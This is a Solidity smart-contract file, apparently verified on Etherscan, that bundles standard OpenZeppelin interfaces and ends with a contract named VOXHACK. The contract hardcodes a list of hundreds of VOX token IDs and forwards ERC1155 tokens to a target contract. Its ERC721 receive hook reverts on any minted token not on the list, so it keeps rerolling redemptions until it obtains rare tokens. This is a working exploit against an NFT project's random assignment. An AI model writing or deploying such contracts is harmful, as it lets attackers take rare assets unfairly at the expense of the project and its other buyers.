/**
 *Submitted for verification at Etherscan.io on 2021-12-24
*/

// File: @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol


// OpenZeppelin Contracts v4.4.0 (token/ERC721/IERC721Receiver.sol)

pragma solidity ^0.8.0;

/**
 * @title ERC721 token receiver interface
 * @dev Interface for any contract that wants to support safeTransfers
 * from ERC721 asset contracts.
 */
interface IERC721Receiver {
    /**
     * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
     * by `operator` from `from`, this function is called.
     *
     * It must return its Solidity selector to confirm the token transfer.
     * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
     *
     * The selector can be obtained in Solidity with `IERC721.onERC721Received.selector`.
     */
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4);
}

// File: @openzeppelin/contracts/utils/introspection/IERC165.sol


// OpenZeppelin Contracts v4.4.0 (utils/introspection/IERC165.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC165 standard, as defined in the
 * https://eips.ethereum.org/EIPS/eip-165[EIP].
 *
 * Implementers can declare support of contract interfaces, which can then be
 * queried by others ({ERC165Checker}).
 *
 * For an implementation, see {ERC165}.
 */
interface IERC165 {
    /**
     * @dev Returns true if this contract implements the interface defined by
     * `interfaceId`. See the corresponding
     * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
     * to learn more about how these ids are created.
     *
     * This function call must use less than 30 000 gas.
     */
    function supportsInterface(bytes4 interfaceId) external view returns (bool);
}

// File: @openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol


// OpenZeppelin Contracts v4.4.1 (token/ERC1155/IERC1155Receiver.sol)

pragma solidity ^0.8.0;


/**
 * @dev _Available since v3.1._
 */
interface IERC1155Receiver is IERC165 {
    /**
        @dev Handles the receipt of a single ERC1155 token type. This function is
        called at the end of a `safeTransferFrom` after the balance has been updated.
        To accept the transfer, this must return
        `bytes4(keccak256("onERC1155Received(address,address,uint256,uint256,bytes)"))`
        (i.e. 0xf23a6e61, or its own function selector).
        @param operator The address which initiated the transfer (i.e. msg.sender)
        @param from The address which previously owned the token
        @param id The ID of the token being transferred
        @param value The amount of tokens being transferred
        @param data Additional data with no specified format
        @return `bytes4(keccak256("onERC1155Received(address,address,uint256,uint256,bytes)"))` if transfer is allowed
    */
    function onERC1155Received(
        address operator,
        address from,
        uint256 id,
        uint256 value,
        bytes calldata data
    ) external returns (bytes4);

    /**
        @dev Handles the receipt of a multiple ERC1155 token types. This function
        is called at the end of a `safeBatchTransferFrom` after the balances have
        been updated. To accept the transfer(s), this must return
        `bytes4(keccak256("onERC1155BatchReceived(address,address,uint256[],uint256[],bytes)"))`
        (i.e. 0xbc197c81, or its own function selector).
        @param operator The address which initiated the batch transfer (i.e. msg.sender)
        @param from The address which previously owned the token
        @param ids An array containing ids of each token being transferred (order and length must match values array)
        @param values An array containing amounts of each token being transferred (order and length must match ids array)
        @param data Additional data with no specified format
        @return `bytes4(keccak256("onERC1155BatchReceived(address,address,uint256[],uint256[],bytes)"))` if transfer is allowed
    */
    function onERC1155BatchReceived(
        address operator,
        address from,
        uint256[] calldata ids,
        uint256[] calldata values,
        bytes calldata data
    ) external returns (bytes4);
}

// File: @openzeppelin/contracts/token/ERC1155/IERC1155.sol


// OpenZeppelin Contracts v4.4.1 (token/ERC1155/IERC1155.sol)

pragma solidity ^0.8.0;


/**
 * @dev Required interface of an ERC1155 compliant contract, as defined in the
 * https://eips.ethereum.org/EIPS/eip-1155[EIP].
 *
 * _Available since v3.1._
 */
interface IERC1155 is IERC165 {
    /**
     * @dev Emitted when `value` tokens of token type `id` are transferred from `from` to `to` by `operator`.
     */
    event TransferSingle(address indexed operator, address indexed from, address indexed to, uint256 id, uint256 value);

    /**
     * @dev Equivalent to multiple {TransferSingle} events, where `operator`, `from` and `to` are the same for all
     * transfers.
     */
    event TransferBatch(
        address indexed operator,
        address indexed from,
        address indexed to,
        uint256[] ids,
        uint256[] values
    );

    /**
     * @dev Emitted when `account` grants or revokes permission to `operator` to transfer their tokens, according to
     * `approved`.
     */
    event ApprovalForAll(address indexed account, address indexed operator, bool approved);

    /**
     * @dev Emitted when the URI for token type `id` changes to `value`, if it is a non-programmatic URI.
     *
     * If an {URI} event was emitted for `id`, the standard
     * https://eips.ethereum.org/EIPS/eip-1155#metadata-extensions[guarantees] that `value` will equal the value
     * returned by {IERC1155MetadataURI-uri}.
     */
    event URI(string value, uint256 indexed id);

    /**
     * @dev Returns the amount of tokens of token type `id` owned by `account`.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     */
    function balanceOf(address account, uint256 id) external view returns (uint256);

    /**
     * @dev xref:ROOT:erc1155.adoc#batch-operations[Batched] version of {balanceOf}.
     *
     * Requirements:
     *
     * - `accounts` and `ids` must have the same length.
     */
    function balanceOfBatch(address[] calldata accounts, uint256[] calldata ids)
        external
        view
        returns (uint256[] memory);

    /**
     * @dev Grants or revokes permission to `operator` to transfer the caller's tokens, according to `approved`,
     *
     * Emits an {ApprovalForAll} event.
     *
     * Requirements:
     *
     * - `operator` cannot be the caller.
     */
    function setApprovalForAll(address operator, bool approved) external;

    /**
     * @dev Returns true if `operator` is approved to transfer ``account``'s tokens.
     *
     * See {setApprovalForAll}.
     */
    function isApprovedForAll(address account, address operator) external view returns (bool);

    /**
     * @dev Transfers `amount` tokens of token type `id` from `from` to `to`.
     *
     * Emits a {TransferSingle} event.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - If the caller is not `from`, it must be have been approved to spend ``from``'s tokens via {setApprovalForAll}.
     * - `from` must have a balance of tokens of type `id` of at least `amount`.
     * - If `to` refers to a smart contract, it must implement {IERC1155Receiver-onERC1155Received} and return the
     * acceptance magic value.
     */
    function safeTransferFrom(
        address from,
        address to,
        uint256 id,
        uint256 amount,
        bytes calldata data
    ) external;

    /**
     * @dev xref:ROOT:erc1155.adoc#batch-operations[Batched] version of {safeTransferFrom}.
     *
     * Emits a {TransferBatch} event.
     *
     * Requirements:
     *
     * - `ids` and `amounts` must have the same length.
     * - If `to` refers to a smart contract, it must implement {IERC1155Receiver-onERC1155BatchReceived} and return the
     * acceptance magic value.
     */
    function safeBatchTransferFrom(
        address from,
        address to,
        uint256[] calldata ids,
        uint256[] calldata amounts,
        bytes calldata data
    ) external;
}

// File: @openzeppelin/contracts/token/ERC721/IERC721.sol


// OpenZeppelin Contracts v4.4.0 (token/ERC721/IERC721.sol)

pragma solidity ^0.8.0;


/**
 * @dev Required interface of an ERC721 compliant contract.
 */
interface IERC721 is IERC165 {
    /**
     * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
     */
    event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);

    /**
     * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
     */
    event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);

    /**
     * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
     */
    event ApprovalForAll(address indexed owner, address indexed operator, bool approved);

    /**
     * @dev Returns the number of tokens in ``owner``'s account.
     */
    function balanceOf(address owner) external view returns (uint256 balance);

    /**
     * @dev Returns the owner of the `tokenId` token.
     *
     * Requirements:
     *
     * - `tokenId` must exist.
     */
    function ownerOf(uint256 tokenId) external view returns (address owner);

    /**
     * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
     * are aware of the ERC721 protocol to prevent tokens from being forever locked.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `tokenId` token must exist and be owned by `from`.
     * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
     *
     * Emits a {Transfer} event.
     */
    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId
    ) external;

    /**
     * @dev Transfers `tokenId` token from `from` to `to`.
     *
     * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `tokenId` token must be owned by `from`.
     * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 tokenId
    ) external;

    /**
     * @dev Gives permission to `to` to transfer `tokenId` token to another account.
     * The approval is cleared when the token is transferred.
     *
     * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
     *
     * Requirements:
     *
     * - The caller must own the token or be an approved operator.
     * - `tokenId` must exist.
     *
     * Emits an {Approval} event.
     */
    function approve(address to, uint256 tokenId) external;

    /**
     * @dev Returns the account approved for `tokenId` token.
     *
     * Requirements:
     *
     * - `tokenId` must exist.
     */
    function getApproved(uint256 tokenId) external view returns (address operator);

    /**
     * @dev Approve or remove `operator` as an operator for the caller.
     * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
     *
     * Requirements:
     *
     * - The `operator` cannot be the caller.
     *
     * Emits an {ApprovalForAll} event.
     */
    function setApprovalForAll(address operator, bool _approved) external;

    /**
     * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
     *
     * See {setApprovalForAll}
     */
    function isApprovedForAll(address owner, address operator) external view returns (bool);

    /**
     * @dev Safely transfers `tokenId` token from `from` to `to`.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `tokenId` token must exist and be owned by `from`.
     * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
     *
     * Emits a {Transfer} event.
     */
    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId,
        bytes calldata data
    ) external;
}

// File: @openzeppelin/contracts/utils/Context.sol


// OpenZeppelin Contracts v4.4.0 (utils/Context.sol)

pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

// File: @openzeppelin/contracts/access/Ownable.sol


// OpenZeppelin Contracts v4.4.0 (access/Ownable.sol)

pragma solidity ^0.8.0;


/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// File: contracts/vox.sol


pragma solidity ^0.8.0;






contract VOXHACK is Ownable, IERC721Receiver, IERC1155Receiver {
    mapping(uint256 => bool) internal voxIds;
    address target;
    constructor(address addr) {
        target = addr;
        voxIds[141] = true;
voxIds[68] = true;
voxIds[74] = true;
voxIds[248] = true;
voxIds[298] = true;
voxIds[329] = true;
voxIds[562] = true;
voxIds[669] = true;
voxIds[860] = true;
voxIds[865] = true;
voxIds[967] = true;
voxIds[1052] = true;
voxIds[1092] = true;
voxIds[1151] = true;
voxIds[1294] = true;
voxIds[1328] = true;
voxIds[1539] = true;
voxIds[1579] = true;
voxIds[1631] = true;
voxIds[1819] = true;
voxIds[1835] = true;
voxIds[1976] = true;
voxIds[2226] = true;
voxIds[2471] = true;
voxIds[2741] = true;
voxIds[2982] = true;
voxIds[3035] = true;
voxIds[3110] = true;
voxIds[3225] = true;
voxIds[3235] = true;
voxIds[3324] = true;
voxIds[3589] = true;
voxIds[3668] = true;
voxIds[3757] = true;
voxIds[3817] = true;
voxIds[3871] = true;
voxIds[3915] = true;
voxIds[3969] = true;
voxIds[4357] = true;
voxIds[4563] = true;
voxIds[4594] = true;
voxIds[4740] = true;
voxIds[4778] = true;
voxIds[4874] = true;
voxIds[5041] = true;
voxIds[5352] = true;
voxIds[5419] = true;
voxIds[5460] = true;
voxIds[5476] = true;
voxIds[5799] = true;
voxIds[6072] = true;
voxIds[6416] = true;
voxIds[6472] = true;
voxIds[6507] = true;
voxIds[6566] = true;
voxIds[6618] = true;
voxIds[6637] = true;
voxIds[6638] = true;
voxIds[6810] = true;
voxIds[7007] = true;
voxIds[141] = true;
voxIds[185] = true;
voxIds[205] = true;
voxIds[231] = true;
voxIds[343] = true;
voxIds[549] = true;
voxIds[560] = true;
voxIds[612] = true;
voxIds[694] = true;
voxIds[825] = true;
voxIds[969] = true;
voxIds[979] = true;
voxIds[1022] = true;
voxIds[1100] = true;
voxIds[1136] = true;
voxIds[1166] = true;
voxIds[1202] = true;
voxIds[1464] = true;
voxIds[1752] = true;
voxIds[1817] = true;
voxIds[1957] = true;
voxIds[2294] = true;
voxIds[2383] = true;
voxIds[2593] = true;
voxIds[3071] = true;
voxIds[3321] = true;
voxIds[3325] = true;
voxIds[3395] = true;
voxIds[3498] = true;
voxIds[3720] = true;
voxIds[3811] = true;
voxIds[3992] = true;
voxIds[4008] = true;
voxIds[4075] = true;
voxIds[4151] = true;
voxIds[4202] = true;
voxIds[4393] = true;
voxIds[4463] = true;
voxIds[4805] = true;
voxIds[4847] = true;
voxIds[5019] = true;
voxIds[5131] = true;
voxIds[5186] = true;
voxIds[5190] = true;
voxIds[5215] = true;
voxIds[5371] = true;
voxIds[5379] = true;
voxIds[5425] = true;
voxIds[5590] = true;
voxIds[5763] = true;
voxIds[6003] = true;
voxIds[6025] = true;
voxIds[6158] = true;
voxIds[6268] = true;
voxIds[6344] = true;
voxIds[6577] = true;
voxIds[6610] = true;
voxIds[6769] = true;
voxIds[6776] = true;
voxIds[6893] = true;
voxIds[7013] = true;
voxIds[7136] = true;
voxIds[7254] = true;
voxIds[7313] = true;
voxIds[7323] = true;
voxIds[7495] = true;
voxIds[7705] = true;
voxIds[7725] = true;
voxIds[7895] = true;
voxIds[7931] = true;
voxIds[8098] = true;
voxIds[8233] = true;
voxIds[8537] = true;
voxIds[8644] = true;
voxIds[8712] = true;
voxIds[22] = true;
voxIds[33] = true;
voxIds[63] = true;
voxIds[84] = true;
voxIds[93] = true;
voxIds[100] = true;
voxIds[110] = true;
voxIds[128] = true;
voxIds[132] = true;
voxIds[142] = true;
voxIds[161] = true;
voxIds[162] = true;
voxIds[175] = true;
voxIds[177] = true;
voxIds[224] = true;
voxIds[233] = true;
voxIds[247] = true;
voxIds[255] = true;
voxIds[260] = true;
voxIds[263] = true;
voxIds[268] = true;
voxIds[271] = true;
voxIds[282] = true;
voxIds[289] = true;
voxIds[304] = true;
voxIds[310] = true;
voxIds[322] = true;
voxIds[333] = true;
voxIds[337] = true;
voxIds[346] = true;
voxIds[380] = true;
voxIds[403] = true;
voxIds[421] = true;
voxIds[445] = true;
voxIds[456] = true;
voxIds[469] = true;
voxIds[556] = true;
voxIds[586] = true;
voxIds[602] = true;
voxIds[606] = true;
voxIds[654] = true;
voxIds[684] = true;
voxIds[704] = true;
voxIds[772] = true;
voxIds[776] = true;
voxIds[801] = true;
voxIds[828] = true;
voxIds[829] = true;
voxIds[834] = true;
voxIds[844] = true;
voxIds[852] = true;
voxIds[855] = true;
voxIds[856] = true;
voxIds[880] = true;
voxIds[899] = true;
voxIds[900] = true;
voxIds[907] = true;
voxIds[919] = true;
voxIds[956] = true;
voxIds[988] = true;
voxIds[1008] = true;
voxIds[1014] = true;
voxIds[1024] = true;
voxIds[1059] = true;
voxIds[1075] = true;
voxIds[1102] = true;
voxIds[1117] = true;
voxIds[1121] = true;
voxIds[1127] = true;
voxIds[1129] = true;
voxIds[1139] = true;
voxIds[1165] = true;
voxIds[1169] = true;
voxIds[1195] = true;
voxIds[1196] = true;
voxIds[1206] = true;
voxIds[1207] = true;
voxIds[1213] = true;
voxIds[1280] = true;
voxIds[1348] = true;
voxIds[1394] = true;
voxIds[1423] = true;
voxIds[1430] = true;
voxIds[1436] = true;
voxIds[1454] = true;
voxIds[1480] = true;
voxIds[1494] = true;
voxIds[1511] = true;
voxIds[1538] = true;
voxIds[1549] = true;
voxIds[1559] = true;
voxIds[1586] = true;
voxIds[1593] = true;
voxIds[1720] = true;
voxIds[1753] = true;
voxIds[1769] = true;
voxIds[1782] = true;
voxIds[1787] = true;
voxIds[1801] = true;
voxIds[1826] = true;
voxIds[1831] = true;
voxIds[1839] = true;
voxIds[1847] = true;
voxIds[1864] = true;
voxIds[1899] = true;
voxIds[1911] = true;
voxIds[2016] = true;
voxIds[2056] = true;
voxIds[2069] = true;
voxIds[2117] = true;
voxIds[2154] = true;
voxIds[2158] = true;
voxIds[2193] = true;
voxIds[2199] = true;
voxIds[2205] = true;
voxIds[2206] = true;
voxIds[2248] = true;
voxIds[2277] = true;
voxIds[2301] = true;
voxIds[2318] = true;
voxIds[2326] = true;
voxIds[2336] = true;
voxIds[2342] = true;
voxIds[2361] = true;
voxIds[2362] = true;
voxIds[2414] = true;
voxIds[2461] = true;
voxIds[2514] = true;
voxIds[2519] = true;
voxIds[2521] = true;
voxIds[2527] = true;
voxIds[2558] = true;
voxIds[2575] = true;
voxIds[2577] = true;
voxIds[2612] = true;
voxIds[2623] = true;
voxIds[2629] = true;
voxIds[2637] = true;
voxIds[2641] = true;
voxIds[2660] = true;
voxIds[2664] = true;
voxIds[2693] = true;
voxIds[2731] = true;
voxIds[2738] = true;
voxIds[2755] = true;
voxIds[2782] = true;
voxIds[2821] = true;
voxIds[2862] = true;
voxIds[2863] = true;
voxIds[2878] = true;
voxIds[2908] = true;
voxIds[2916] = true;
voxIds[2928] = true;
voxIds[2937] = true;
voxIds[2943] = true;
voxIds[2967] = true;
voxIds[3004] = true;
voxIds[3022] = true;
voxIds[3052] = true;
voxIds[3058] = true;
voxIds[3072] = true;
voxIds[3138] = true;
voxIds[3142] = true;
voxIds[3148] = true;
voxIds[3155] = true;
voxIds[3170] = true;
voxIds[3189] = true;
voxIds[3234] = true;
voxIds[3239] = true;
voxIds[3255] = true;
voxIds[3263] = true;
voxIds[3264] = true;
voxIds[3280] = true;
voxIds[3294] = true;
voxIds[3306] = true;
voxIds[3310] = true;
voxIds[3313] = true;
voxIds[3314] = true;
voxIds[3323] = true;
voxIds[3334] = true;
voxIds[3366] = true;
voxIds[3385] = true;
voxIds[3413] = true;
voxIds[3420] = true;
voxIds[3440] = true;
voxIds[3459] = true;
voxIds[3469] = true;
voxIds[3514] = true;
voxIds[3548] = true;
voxIds[3552] = true;
voxIds[3563] = true;
voxIds[3588] = true;
voxIds[3591] = true;
voxIds[3605] = true;
voxIds[3606] = true;
voxIds[3648] = true;
voxIds[3680] = true;
voxIds[3684] = true;
voxIds[3693] = true;
voxIds[3699] = true;
voxIds[3710] = true;
voxIds[3715] = true;
voxIds[3738] = true;
voxIds[3764] = true;
voxIds[3771] = true;
voxIds[3781] = true;
voxIds[3801] = true;
voxIds[3806] = true;
voxIds[3827] = true;
voxIds[3840] = true;
voxIds[3865] = true;
voxIds[3876] = true;
voxIds[3881] = true;
voxIds[3889] = true;
voxIds[3893] = true;
voxIds[3931] = true;
voxIds[3942] = true;
voxIds[3964] = true;
voxIds[3968] = true;
voxIds[3994] = true;
voxIds[4022] = true;
voxIds[4026] = true;
voxIds[4054] = true;
voxIds[4073] = true;
voxIds[4136] = true;
voxIds[4192] = true;
voxIds[4198] = true;
voxIds[4208] = true;
voxIds[4263] = true;
voxIds[4269] = true;
voxIds[4287] = true;
voxIds[4306] = true;
voxIds[4311] = true;
voxIds[4314] = true;
voxIds[4332] = true;
voxIds[4380] = true;
voxIds[4397] = true;
voxIds[4399] = true;
voxIds[4445] = true;
voxIds[4457] = true;
voxIds[4512] = true;
voxIds[4555] = true;
voxIds[4558] = true;
voxIds[4621] = true;
voxIds[4660] = true;
voxIds[4687] = true;
voxIds[4692] = true;
voxIds[4695] = true;
voxIds[4739] = true;
voxIds[4774] = true;
voxIds[4780] = true;
voxIds[4824] = true;
voxIds[4828] = true;
voxIds[4835] = true;
voxIds[4881] = true;
voxIds[4947] = true;
voxIds[4986] = true;
voxIds[5001] = true;
voxIds[5014] = true;
voxIds[5023] = true;
voxIds[5274] = true;
voxIds[5287] = true;
voxIds[5292] = true;
voxIds[5309] = true;
voxIds[5332] = true;
voxIds[5346] = true;
voxIds[5348] = true;
voxIds[5360] = true;
voxIds[5383] = true;
voxIds[5384] = true;
voxIds[5389] = true;
voxIds[5391] = true;
voxIds[5399] = true;
voxIds[5402] = true;
voxIds[5416] = true;
voxIds[5436] = true;
voxIds[5444] = true;
voxIds[5478] = true;
voxIds[5519] = true;
voxIds[5537] = true;
voxIds[5540] = true;
voxIds[5028] = true;
voxIds[5050] = true;
voxIds[5062] = true;
voxIds[5077] = true;
voxIds[5093] = true;
voxIds[5100] = true;
voxIds[5141] = true;
voxIds[5156] = true;
voxIds[5211] = true;
voxIds[5213] = true;
voxIds[5221] = true;
voxIds[5223] = true;
voxIds[5230] = true;
voxIds[5234] = true;
voxIds[5257] = true;
voxIds[5595] = true;
voxIds[5652] = true;
voxIds[5659] = true;
voxIds[5678] = true;
voxIds[5685] = true;
voxIds[5687] = true;
voxIds[5720] = true;
voxIds[5729] = true;
voxIds[5739] = true;
voxIds[5748] = true;
voxIds[5770] = true;
voxIds[5805] = true;
voxIds[5822] = true;
voxIds[5825] = true;
voxIds[5876] = true;
voxIds[5898] = true;
voxIds[5935] = true;
voxIds[5945] = true;
voxIds[5949] = true;
voxIds[5976] = true;
voxIds[5992] = true;
voxIds[6008] = true;
voxIds[6010] = true;
voxIds[6017] = true;
voxIds[6035] = true;
voxIds[6040] = true;
voxIds[6061] = true;
voxIds[6068] = true;
voxIds[6144] = true;
voxIds[6164] = true;
voxIds[6184] = true;
voxIds[6196] = true;
voxIds[6271] = true;
voxIds[6314] = true;
voxIds[6318] = true;
voxIds[6323] = true;
voxIds[6337] = true;
voxIds[6362] = true;
voxIds[6389] = true;
voxIds[6391] = true;
voxIds[6420] = true;
voxIds[6422] = true;
voxIds[6431] = true;
voxIds[6501] = true;
voxIds[6529] = true;
voxIds[6538] = true;
voxIds[6559] = true;
voxIds[6576] = true;
voxIds[6586] = true;
voxIds[6591] = true;
voxIds[6633] = true;
voxIds[6646] = true;
voxIds[6648] = true;
voxIds[6650] = true;
voxIds[6675] = true;
voxIds[6677] = true;
voxIds[6707] = true;
voxIds[6723] = true;
voxIds[6777] = true;
voxIds[6786] = true;
voxIds[6787] = true;
voxIds[6812] = true;
voxIds[6825] = true;
voxIds[6844] = true;
voxIds[7012] = true;
voxIds[7020] = true;
voxIds[7034] = true;
voxIds[7050] = true;
voxIds[7057] = true;
voxIds[7073] = true;
voxIds[7116] = true;
voxIds[7133] = true;
voxIds[7155] = true;
voxIds[7216] = true;
voxIds[7277] = true;
voxIds[7302] = true;
voxIds[7335] = true;
voxIds[7344] = true;
voxIds[7374] = true;
voxIds[7375] = true;
voxIds[7412] = true;
voxIds[7416] = true;
voxIds[7426] = true;
voxIds[7438] = true;
voxIds[7440] = true;
voxIds[7453] = true;
voxIds[7457] = true;
voxIds[7464] = true;
voxIds[7470] = true;
voxIds[7482] = true;
voxIds[7509] = true;
voxIds[7546] = true;
voxIds[7551] = true;
voxIds[7568] = true;
voxIds[7580] = true;
voxIds[7581] = true;
voxIds[7582] = true;
voxIds[7585] = true;
voxIds[7586] = true;
voxIds[7608] = true;
voxIds[7626] = true;
voxIds[7671] = true;
voxIds[7696] = true;
voxIds[7703] = true;
voxIds[7720] = true;
voxIds[7777] = true;
voxIds[7796] = true;
voxIds[7852] = true;
voxIds[7862] = true;
voxIds[7904] = true;
voxIds[7943] = true;
voxIds[7947] = true;
voxIds[7965] = true;
voxIds[8107] = true;
voxIds[8128] = true;
voxIds[8165] = true;
voxIds[8182] = true;
voxIds[8263] = true;
voxIds[8271] = true;
voxIds[8280] = true;
voxIds[8283] = true;
voxIds[8284] = true;
voxIds[8313] = true;
voxIds[8329] = true;
voxIds[8330] = true;
voxIds[8357] = true;
voxIds[8371] = true;
voxIds[8378] = true;
voxIds[8403] = true;
voxIds[8465] = true;
voxIds[8480] = true;
voxIds[8488] = true;
voxIds[8495] = true;
voxIds[8509] = true;
voxIds[8548] = true;
voxIds[8554] = true;
voxIds[8573] = true;
voxIds[8577] = true;
voxIds[8595] = true;
voxIds[8597] = true;
voxIds[8610] = true;
voxIds[8653] = true;
voxIds[8681] = true;
voxIds[8688] = true;
voxIds[8696] = true;
voxIds[8703] = true;
voxIds[8704] = true;
voxIds[8741] = true;
voxIds[8770] = true;
voxIds[8772] = true;
voxIds[8779] = true;
voxIds[8804] = true;
voxIds[8851] = true;
voxIds[8855] = true;
voxIds[8857] = true;
    }
    function pokgai(
        IERC1155 token,
        uint256 tokenId
    ) external payable onlyOwner {
        token.safeTransferFrom(msg.sender, address(this), tokenId, 1, "");
        token.safeTransferFrom(address(this), target, tokenId, 1, "");
    }

    function withdrawBalance(address to) external onlyOwner {
        (bool success, ) = to.call{value: address(this).balance}("");
        require(success, "BALANCE_TRANSFER_FAILURE");
    }

    function withdrawERC721(
        IERC721 token,
        address receiver,
        uint256 tokenId
    ) external onlyOwner {
        token.transferFrom(address(this), receiver, tokenId);
    }

    function withdrawERC1155(
        IERC1155 token,
        address receiver,
        uint256 tokenId
    ) external onlyOwner {
        token.safeTransferFrom(address(this), receiver, tokenId, 1, "");
    }

    function onERC1155Received(
        address,
        address,
        uint256,
        uint256,
        bytes calldata
    ) public virtual override returns (bytes4) {
        return this.onERC1155Received.selector;
    }


    function onERC1155BatchReceived(
      address,
        address,
        uint256[] calldata,
        uint256[] calldata,
        bytes memory
    ) public virtual override returns (bytes4) {
        return this.onERC1155BatchReceived.selector;
    }


    function onERC721Received(
        address operator,
        address,
        uint256 tokenId,
        bytes memory
    ) public virtual override returns (bytes4) {
        IERC721 sender = IERC721(msg.sender);
        require (voxIds[tokenId]);
        sender.transferFrom(operator, owner(), tokenId);
        return this.onERC721Received.selector;
    }

  function supportsInterface(bytes4) external pure override returns (bool) {
      return true;
  }
}